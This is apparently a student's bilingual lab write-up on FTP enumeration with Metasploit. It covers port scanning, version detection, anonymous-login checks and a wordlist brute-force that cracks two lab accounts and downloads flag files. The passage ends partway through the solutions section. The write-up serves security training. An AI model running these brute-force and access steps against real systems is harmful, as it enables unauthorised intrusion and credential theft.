---
layout: post
title: "FTP Enumeration"
date: "2022-12-03"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - The Metasploit Framework (MSF)
---

# FTP Enumeration
FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients.

It is also frequently used as a means of transferring files to and from the directory of a web server.

We can use multiple auxiliary modules to enumerate information as well as perform brute-force attacks on targets running an FTP server.

FTP authentication utilizes a username and password combination, however, in some cases an improperly configured FTP server can be logged into anonymously.

# FTP枚举
FTP（文件传输协议）是一种使用 TCP 端口 21 的协议，用于促进服务器和客户端之间的文件共享。

它还经常用作在 Web 服务器的目录之间传输文件的方式。

我们可以使用多个辅助模块来枚举信息以及对运行 FTP 服务器的目标执行暴力攻击。

FTP 身份验证使用用户名和密码组合，但是，在某些情况下，配置不当的 FTP 服务器可以匿名登录。

# Demo: FTP Enumeration（演示：FTP 枚举）
```
service postgresql start
```

```
ifconfig
eth1 192.51.147.2
```

```
msfconsole
```

```
workspace -a FTP_ENUM
workspace
```

[TCP Port Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/)

TCP 端口扫描器

通过在每个端口上执行完整的 TCP 连接来枚举打开的 TCP 服务。这不需要源机器上的管理权限，这在旋转时可能很有用。

```
search portscan
use auxiliary/scanner/portscan/tcp
show options
set RHOSTS 192.51.147.3
run
back
```

```
search type:auxiliary name:ftp
```

[FTP Version Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/ftp_version/)

```
use auxiliary/scanner/ftp/ftp_version
show options
set RHOSTS 192.51.147.3
run
search ProFTPD
back
```

[FTP Authentication Scanner](https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/ftp_login/)

FTP 身份验证扫描程序

该模块将在一系列机器上测试 FTP 登录并报告成功登录。如果您加载了数据库插件并连接到数据库，此模块将记录成功的登录和主机，以便您可以跟踪您的访问。

```
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/ftp_login
show options
set RHOSTS 192.51.147.3
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

```
ftp
exit
ftp 192.51.147.3
back
```

[Anonymous FTP Access Detection](https://www.rapid7.com/db/modules/auxiliary/scanner/ftp/anonymous/)

匿名 FTP 访问检测

检测匿名（读/写）FTP 服务器访问。

```
search type:auxiliary name:ftp
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.51.147.3
run
exit
```

```
ftp 192.51.147.3
ftp> ls
ftp> get secret.txt
ftp> exit
ls
cat secret.txt
```

# FTP Enumeration（FTP枚举）
## Overview
This lab covers the process of performing FTP enumeration with Metasploit.

## 我自己的思路
```
root@attackdefense:~# ifconfig
eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.136.48.2  netmask 255.255.255.0  broadcast 192.136.48.255
        ether 02:42:c0:88:30:02  txqueuelen 0  (Ethernet)
```

```
root@attackdefense:~# service postgresql start
[ ok ] Starting PostgreSQL 11 database server: main.
root@attackdefense:~# msfconsole -q
msf5 > workspace
* default
msf5 > workspace -a FTP_ENUM
[*] Added workspace: FTP_ENUM
[*] Workspace: FTP_ENUM
msf5 > workspace
  default
* FTP_ENUM
msf5 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   1  auxiliary/scanner/http/wordpress_pingback_access                   normal  Yes    Wordpress Pingback Locator
   2  auxiliary/scanner/natpmp/natpmp_portscan                           normal  Yes    NAT-PMP External Port Scanner
   3  auxiliary/scanner/portscan/ack                                     normal  Yes    TCP ACK Firewall Scanner
   4  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   5  auxiliary/scanner/portscan/syn                                     normal  Yes    TCP SYN Port Scanner
   6  auxiliary/scanner/portscan/tcp                                     normal  Yes    TCP Port Scanner
   7  auxiliary/scanner/portscan/xmas                                    normal  Yes    TCP "XMas" Port Scanner
   8  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner


msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.136.48.3
RHOSTS => 192.136.48.3
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.136.48.3:         - 192.136.48.3:21 - TCP OPEN
[*] 192.136.48.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/portscan/tcp) > search -h
Usage: search [ options ] <keywords>

OPTIONS:
  -h                Show this help information
  -o <file>         Send output to a file in csv format
  -S <string>       Search string for row filter
  -u                Use module if there is one result

Keywords:
  aka         :  Modules with a matching AKA (also-known-as) name
  author      :  Modules written by this author
  arch        :  Modules affecting this architecture
  bid         :  Modules with a matching Bugtraq ID
  cve         :  Modules with a matching CVE ID
  edb         :  Modules with a matching Exploit-DB ID
  check       :  Modules that support the 'check' method
  date        :  Modules with a matching disclosure date
  description :  Modules with a matching description
  full_name   :  Modules with a matching full name
  mod_time    :  Modules with a matching modification date
  name        :  Modules with a matching descriptive name
  path        :  Modules with a matching path
  platform    :  Modules affecting this platform
  port        :  Modules with a matching port
  rank        :  Modules with a matching rank (Can be descriptive (ex: 'good') or numeric with comparison operators (ex: 'gte400'))
  ref         :  Modules with a matching ref
  reference   :  Modules with a matching reference
  target      :  Modules affecting this target
  type        :  Modules of a specific type (exploit, payload, auxiliary, encoder, evasion, post, or nop)

Examples:
  search cve:2009 type:exploit
```

```
msf5 辅助（扫描仪/portscan/tcp）> 搜索-h
用法：搜索 [ 选项 ] <关键字>

选项：
   -h 显示此帮助信息
   -o <file> 将输出以 csv 格式发送到文件
   -S <string> 行过滤器的搜索字符串
   -u 如果有一个结果则使用模块

关键词：
   aka ：具有匹配的 AKA（也称为）名称的模块
   author ：作者编写的模块
   arch ：影响此架构的模块
   bid ：具有匹配 Bugtraq ID 的模块
   cve ：具有匹配 CVE ID 的模块
   edb ：具有匹配的 Exploit-DB ID 的模块
   check ：支持“check”方法的模块
   date ：具有匹配披露日期的模块
   description ：具有匹配描述的模块
   full_name ：具有匹配全名的模块
   mod_time ：具有匹配修改日期的模块
   name ：具有匹配描述性名称的模块
   path ：具有匹配路径的模块
   platform : 影响这个平台的模块
   port : 具有匹配端口的模块
   rank ：具有匹配等级的模块（可以是描述性的（例如：'good'）或带有比较运算符的数字（例如：'gte400'））
   ref ：具有匹配 ref 的模块
   reference ：具有匹配参考的模块
   target ：影响此目标的模块
   type ：特定类型的模块（exploit、payload、auxiliary、encoder、evasion、post 或 nop）

例子：
   搜索 cve:2009 type:exploit
```

```
msf5 auxiliary(scanner/portscan/tcp) > search type:auxiliary name:ftp

Matching Modules
================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   1   auxiliary/admin/cisco/vpn_3000_ftp_bypass         2006-08-23       normal  No     Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access
   2   auxiliary/admin/tftp/tftp_transfer_util                            normal  No     TFTP File Transfer Utility
   3   auxiliary/dos/scada/d20_tftp_overflow             2012-01-19       normal  No     General Electric D20ME TFTP Server Buffer Overflow DoS
   4   auxiliary/dos/windows/ftp/filezilla_admin_user    2005-11-07       normal  No     FileZilla FTP Server Admin Interface Denial of Service
   5   auxiliary/dos/windows/ftp/filezilla_server_port   2006-12-11       normal  No     FileZilla FTP Server Malformed PORT Denial of Service
   6   auxiliary/dos/windows/ftp/guildftp_cwdlist        2008-10-12       normal  No     Guild FTPd 0.999.8.11/0.999.14 Heap Corruption
   7   auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof      2010-12-21       normal  No     Microsoft IIS FTP Server Encoded Response Overflow Trigger
   8   auxiliary/dos/windows/ftp/iis_list_exhaustion     2009-09-03       normal  No     Microsoft IIS FTP Server LIST Stack Exhaustion
   9   auxiliary/dos/windows/ftp/solarftp_user           2011-02-22       normal  No     Solar FTP Server Malformed USER Denial of Service
   10  auxiliary/dos/windows/ftp/titan626_site           2008-10-14       normal  No     Titan FTP Server 6.26.630 SITE WHO DoS
   11  auxiliary/dos/windows/ftp/vicftps50_list          2008-10-24       normal  No     Victory FTP Server 5.0 LIST DoS
   12  auxiliary/dos/windows/ftp/winftp230_nlst          2008-09-26       normal  No     WinFTP 2.3.0 NLST Denial of Service
   13  auxiliary/dos/windows/ftp/xmeasy560_nlst          2008-10-13       normal  No     XM Easy Personal FTP Server 5.6.0 NLST DoS
   14  auxiliary/dos/windows/ftp/xmeasy570_nlst          2009-03-27       normal  No     XM Easy Personal FTP Server 5.7.0 NLST DoS
   15  auxiliary/dos/windows/tftp/pt360_write            2008-10-29       normal  No     PacketTrap TFTP Server 2.2.5459.0 DoS
   16  auxiliary/dos/windows/tftp/solarwinds             2010-05-21       normal  No     SolarWinds TFTP Server 10.4.0.10 Denial of Service
   17  auxiliary/fuzzers/ftp/client_ftp                                   normal  No     Simple FTP Client Fuzzer
   18  auxiliary/fuzzers/ftp/ftp_pre_post                                 normal  Yes    Simple FTP Fuzzer
   19  auxiliary/scanner/ftp/anonymous                                    normal  Yes    Anonymous FTP Access Detection
   20  auxiliary/scanner/ftp/bison_ftp_traversal         2015-09-28       normal  Yes    BisonWare BisonFTP Server 3.5 Directory Traversal Information Disclosure
   21  auxiliary/scanner/ftp/colorado_ftp_traversal      2016-08-11       normal  Yes    ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure
   22  auxiliary/scanner/ftp/easy_file_sharing_ftp       2017-03-07       normal  Yes    Easy File Sharing FTP Server 3.6 Directory Traversal
   23  auxiliary/scanner/ftp/ftp_login                                    normal  Yes    FTP Authentication Scanner
   24  auxiliary/scanner/ftp/ftp_version                                  normal  Yes    FTP Version Scanner
   25  auxiliary/scanner/ftp/konica_ftp_traversal        2015-09-22       normal  Yes    Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure
   26  auxiliary/scanner/ftp/pcman_ftp_traversal         2015-09-28       normal  Yes    PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure
   27  auxiliary/scanner/ftp/titanftp_xcrc_traversal     2010-06-15       normal  Yes    Titan FTP XCRC Directory Traversal Information Disclosure
   28  auxiliary/scanner/http/titan_ftp_admin_pwd                         normal  Yes    Titan FTP Administrative Password Disclosure
   29  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   30  auxiliary/scanner/snmp/cisco_config_tftp                           normal  Yes    Cisco IOS SNMP Configuration Grabber (TFTP)
   31  auxiliary/scanner/snmp/cisco_upload_file                           normal  Yes    Cisco IOS SNMP File Upload (TFTP)
   32  auxiliary/scanner/ssh/cerberus_sftp_enumusers     2014-05-27       normal  Yes    Cerberus FTP Server SFTP Username Enumeration
   33  auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp  2011-12-12       normal  Yes    IpSwitch WhatsUp Gold TFTP Directory Traversal
   34  auxiliary/scanner/tftp/netdecision_tftp           2009-05-16       normal  Yes    NetDecision 4.2 TFTP Directory Traversal
   35  auxiliary/scanner/tftp/tftpbrute                                   normal  Yes    TFTP Brute Forcer
   36  auxiliary/server/capture/ftp                                       normal  No     Authentication Capture: FTP
   37  auxiliary/server/ftp                                               normal  No     FTP File Server
   38  auxiliary/server/tftp                                              normal  No     TFTP File Server
   39  auxiliary/server/wget_symlink_file_write          2014-10-27       normal  No     GNU Wget FTP Symlink Arbitrary Filesystem Access
```

```
msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/ftp/ftp_version
msf5 auxiliary(scanner/ftp/ftp_version) > show options

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.136.48.3
RHOSTS => 192.136.48.3
msf5 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.136.48.3:21       - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.136.48.3]\x0d\x0a'
[*] 192.136.48.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
msf5 auxiliary(scanner/ftp/ftp_version) > search ProFTPD

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   1  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   2  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
   6  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
```

```
msf5 auxiliary(scanner/ftp/ftp_version) > use auxiliary/scanner/ftp/anonymous
msf5 auxiliary(scanner/ftp/anonymous) > show options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/anonymous) > set RHOSTS 192.136.48.3
RHOSTS => 192.136.48.3
msf5 auxiliary(scanner/ftp/anonymous) > run

[*] 192.136.48.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```
root@attackdefense:~# ls -l /usr/share/metasploit-framework/data/wordlists/
total 2200
-rw-r--r-- 1 root root    791 Apr 18  2019 adobe_top100_pass.txt
-rw-r--r-- 1 root root    754 Apr 18  2019 av-update-urls.txt
-rw-r--r-- 1 root root   7568 Apr 18  2019 av_hips_executables.txt
-rw-r--r-- 1 root root   7418 Apr 18  2019 burnett_top_1024.txt
-rw-r--r-- 1 root root   3585 Apr 18  2019 burnett_top_500.txt
-rw-r--r-- 1 root root     47 Apr 18  2019 can_flood_frames.txt
-rw-r--r-- 1 root root    236 Apr 18  2019 cms400net_default_userpass.txt
-rw-r--r-- 1 root root    444 Feb  7  2019 common_passwords.txt
-rw-r--r-- 1 root root  37000 Apr 18  2019 common_roots.txt
-rw-r--r-- 1 root root     52 Feb  7  2019 common_users.txt
-rw-r--r-- 1 root root  11349 Apr 18  2019 dangerzone_a.txt
-rw-r--r-- 1 root root   2166 Apr 18  2019 dangerzone_b.txt
-rw-r--r-- 1 root root     68 Apr 18  2019 db2_default_pass.txt
-rw-r--r-- 1 root root     41 Apr 18  2019 db2_default_user.txt
-rw-r--r-- 1 root root    124 Apr 18  2019 db2_default_userpass.txt
-rw-r--r-- 1 root root   9323 Apr 18  2019 default_pass_for_services_unhash.txt
-rw-r--r-- 1 root root  23489 Apr 18  2019 default_userpass_for_services_unhash.txt
-rw-r--r-- 1 root root   6819 Apr 18  2019 default_users_for_services_unhash.txt
-rw-r--r-- 1 root root    196 Feb  7  2019 directory.txt
-rw-r--r-- 1 root root    496 Apr 18  2019 dlink_telnet_backdoor_userpass.txt
-rw-r--r-- 1 root root    102 Feb  7  2019 files.txt
-rw-r--r-- 1 root root   1354 Apr 18  2019 hci_oracle_passwords.csv
-rw-r--r-- 1 root root    126 Apr 18  2019 http_default_pass.txt
-rw-r--r-- 1 root root    170 Apr 18  2019 http_default_userpass.txt
-rw-r--r-- 1 root root     99 Apr 18  2019 http_default_users.txt
-rw-r--r-- 1 root root    100 Apr 18  2019 http_owa_common.txt
-rw-r--r-- 1 root root     23 Apr 18  2019 idrac_default_pass.txt
-rw-r--r-- 1 root root     17 Apr 18  2019 idrac_default_user.txt
-rw-r--r-- 1 root root   8670 Apr 18  2019 ipmi_passwords.txt
-rw-r--r-- 1 root root     50 Apr 18  2019 ipmi_users.txt
-rw-r--r-- 1 root root  50338 Apr 18  2019 joomla.txt
-rw-r--r-- 1 root root    177 Apr 18  2019 keyboard-patterns.txt
-rw-r--r-- 1 root root     84 Apr 18  2019 lync_subdomains.txt
-rw-r--r-- 1 root root  69823 Apr 18  2019 malicious_urls.txt
-rw-r--r-- 1 root root    306 Apr 18  2019 mirai_pass.txt
-rw-r--r-- 1 root root    115 Apr 18  2019 mirai_user.txt
-rw-r--r-- 1 root root    768 Apr 18  2019 mirai_user_pass.txt
-rw-r--r-- 1 root root    383 Apr 18  2019 multi_vendor_cctv_dvr_pass.txt
-rw-r--r-- 1 root root     11 Apr 18  2019 multi_vendor_cctv_dvr_users.txt
-rw-r--r-- 1 root root    281 Apr 18  2019 named_pipes.txt
-rw-r--r-- 1 root root  11966 Apr 18  2019 namelist.txt
-rw-r--r-- 1 root root  16767 Apr 18  2019 oracle_default_hashes.txt
-rw-r--r-- 1 root root  59294 Apr 18  2019 oracle_default_passwords.csv
-rw-r--r-- 1 root root   7681 Apr 18  2019 oracle_default_userpass.txt
-rw-r--r-- 1 root root 820321 Apr 18  2019 password.lst
-rw-r--r-- 1 root root  12098 Apr 18  2019 piata_ssh_userpass.txt
-rw-r--r-- 1 root root     31 Apr 18  2019 postgres_default_pass.txt
-rw-r--r-- 1 root root     22 Apr 18  2019 postgres_default_user.txt
-rw-r--r-- 1 root root     78 Apr 18  2019 postgres_default_userpass.txt
-rw-r--r-- 1 root root    644 Apr 18  2019 root_userpass.txt
-rw-r--r-- 1 root root   7023 Apr 18  2019 routers_userpass.txt
-rw-r--r-- 1 root root  17095 Apr 18  2019 rpc_names.txt
-rw-r--r-- 1 root root     36 Apr 18  2019 rservices_from_users.txt
-rw-r--r-- 1 root root    117 Apr 18  2019 sap_common.txt
-rw-r--r-- 1 root root    448 Apr 18  2019 sap_default.txt
-rw-r--r-- 1 root root  13719 Apr 18  2019 sap_icm_paths.txt
-rw-r--r-- 1 root root    816 Apr 18  2019 scada_default_userpass.txt
-rw-r--r-- 1 root root    217 Apr 18  2019 sensitive_files.txt
-rw-r--r-- 1 root root    176 Apr 18  2019 sensitive_files_win.txt
-rw-r--r-- 1 root root   3838 Apr 18  2019 sid.txt
-rw-r--r-- 1 root root    844 Apr 18  2019 snmp_default_pass.txt
-rw-r--r-- 1 root root   3426 Apr 18  2019 tftp.txt
-rw-r--r-- 1 root root     47 Apr 18  2019 tomcat_mgr_default_pass.txt
-rw-r--r-- 1 root root    132 Apr 18  2019 tomcat_mgr_default_userpass.txt
-rw-r--r-- 1 root root     37 Apr 18  2019 tomcat_mgr_default_users.txt
-rw-r--r-- 1 root root   7883 Apr 18  2019 unix_passwords.txt
-rw-r--r-- 1 root root    781 Apr 18  2019 unix_users.txt
-rw-r--r-- 1 root root      9 Apr 18  2019 vnc_passwords.txt
-rw-r--r-- 1 root root 575885 Apr 18  2019 vxworks_collide_20.txt
-rw-r--r-- 1 root root 229871 Apr 18  2019 vxworks_common_20.txt
```

```
msf5 > use auxiliary/scanner/ftp/ftp_login
msf5 auxiliary(scanner/ftp/ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record anonymous/guest logins to the database
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             21               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ftp/ftp_login) > set RHOSTS 192.136.48.3
RHOSTS => 192.136.48.3
msf5 auxiliary(scanner/ftp/ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

```
msf5 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.136.48.3:21       - 192.136.48.3:21 - Starting FTP login sweep
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:admin (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:123456 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:12345 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:123456789 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:password (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:iloveyou (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:princess (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:1234567 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:12345678 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:abc123 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:nicole (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:daniel (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:babygirl (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:monkey (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:lovely (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: sysadmin:jessica (Incorrect: )
[+] 192.136.48.3:21       - 192.136.48.3:21 - Login Successful: sysadmin:654321
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:admin (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:123456 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:12345 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:123456789 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:password (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:iloveyou (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:princess (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:1234567 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:12345678 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:abc123 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:nicole (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:daniel (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:babygirl (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:monkey (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:lovely (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:jessica (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:654321 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:michael (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: rooty:ashley (Incorrect: )
[+] 192.136.48.3:21       - 192.136.48.3:21 - Login Successful: rooty:qwerty
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:admin (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:123456 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:12345 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:123456789 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:password (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:iloveyou (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:princess (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:1234567 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:12345678 (Incorrect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:abc123 (Unable to Connect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:nicole (Unable to Connect: )
[-] 192.136.48.3:21       - 192.136.48.3:21 - LOGIN FAILED: demo:daniel (Unable to Connect: )
[*] 192.136.48.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

发现两对用户名和密码可以成功登录：

```
[+] 192.136.48.3:21       - 192.136.48.3:21 - Login Successful: sysadmin:654321
[+] 192.136.48.3:21       - 192.136.48.3:21 - Login Successful: rooty:qwerty
```

尝试登录sysadmin：

```
root@attackdefense:~# ftp 192.136.48.3
Connected to 192.136.48.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.136.48.3]
Name (192.136.48.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (429.6875 kB/s)
ftp> bye
221 Goodbye.
root@attackdefense:~# ls
README  secret.txt  tools  wordlists
root@attackdefense:~# cat secret.txt 
260ca9dd8a4577fc00b7bd5810298076
```

尝试登录rooty：

```
root@attackdefense:~# ftp 192.136.48.3
Connected to 192.136.48.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.136.48.3]
Name (192.136.48.3:root): rooty
331 Password required for rooty
Password:
230 User rooty logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt 
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (60.8048 kB/s)
ftp> bye
221 Goodbye.
root@attackdefense:~# cat secret.txt 
e529a9cea4a728eb9c5828b13b22844c
```

## Solutions
Step 1: Open the lab link to access the Kali GUI instance

Step 2: Identify the target IP address

To begin with you will need to identify the target system's IP address, this can be done by running the following command:

Command:

```
ifconfig
```

As shown in the following screenshot, locate the IP address associated with the eth1 interface, the target IP address is the next IP within the subnet.

In this case the Kali Linux IP is 192.51.147.2 so the target IP will be 192.51.147.3.

Note: Your target IP address will be different, so make sure to substitute the IP shown in the commands below with the one in your lab.

Step 3: FTP enumeration with Metasploit

